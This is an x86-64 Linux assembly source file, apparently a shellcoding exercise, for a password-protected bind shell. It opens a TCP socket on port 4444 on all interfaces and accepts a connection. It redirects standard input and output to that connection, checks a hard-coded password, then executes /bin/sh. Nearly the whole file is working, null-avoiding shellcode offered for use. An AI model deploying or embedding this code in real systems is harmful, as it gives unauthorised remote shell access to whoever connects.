 
global _start

section .text

_start:
	jmp real_start
    enter_password: db 'Enter your password: ', 0xa

real_start:
; syscall: socket --> open a socket
; int socket(int domain, int type, int protocol);

	xor rax,rax
	add al, 0x29 ;41:syscall number
	xor rdi,rdi
	add rdi,0x2 ;2:AF_INET
	xor rsi,rsi
	inc rsi		;1:SOCK_STREAM
	xor rdx,rdx ;0:INADDR_ANY
	syscall

	mov rdi,rax

; syscall bind --> binding the shell to IP and port
; int bind(int sockfd, const struct sockaddr addr, socklen_t addrlen);

	xor rax, rax 
	push rax
	push rax 			;0.0.0.0
	push word 0x5C11 	;port 4444
	push word 0x02		;2:AF_INET
	mov rsi,rsp
	add rdx,0x10 		;16:length
	add al, 0x31 		;49:syscall bind
	syscall


; syscalls.listen --> listen for incoming connections
; int listen(int sockfd, int backlog);

	xor rax,rax
	add al, 0x32 	;50:syscall listen
	xor rsi,rsi
	inc rsi 		;1:backlog
	syscall

;syscalls.accept --> accept incoming connections
;int accept(int sockfd, struct sockaddr addr, socklen_t addrlen);	

	xor rax,rax
	add al, 0x2b 	;43:syscall accept
	xor rsi,rsi		;0:rsi
	mov rdx,rsi 	;0:rdx
	syscall
	mov r15,rax 	;we'll save the socket handle for later phases

;syscalls.dup2
	
	xor rsi,rsi
	add rsi, 0x02   ;counter with fd
	mov rdi, r15 	;socket handle that we saved before

	loop:
		xor rax,rax
		add al,0x21  ;33:syscall dup2
		syscall
		dec rsi
		jns loop

	checkpassword:
; sys_write
        xor rax,rax                  
        mov rdx,rax                  
        inc rax                      ; rax:1
        mov rdi,rax                  ; move 1 into rdi
        lea rsi,[rel enter_password] ; enter_password
        add rdx,21                   ; setting size enter_password
        syscall

;syscall.read --> to read the password
;ssize_t read(int fd, void *buf, size_t count);

		xor rax,rax 
        mov rdi,rax 
        mov rdx,rax 
        mov rsi, rsp    
        add rdx, 8      ; size of password
        syscall 		

        mov rdi, rsp                
        mov rax, 0x68736173696c616b ;moving password into buffer
        scasd                       ;scann for a match
        jne checkpassword           ;re-ask for password


;syscalls.execve

	xor rax, rax        
    add rax, 59

    xor r9, r9
    push r9

    mov rbx, 0x68732f6e69622f2f	;/bin//sh in reverse
    push rbx 

    mov rdi, rsp
    push r9
    mov rdx, rsp

    push rdi
    mov  rsi, rsp
    syscall

;syscalls.close
	exit:
	xor rax,rax
	add al,0x03 ;3:syscall close
	syscall

	xor rax,rax
	add al,0x3C ;60:syscall exit
	syscall
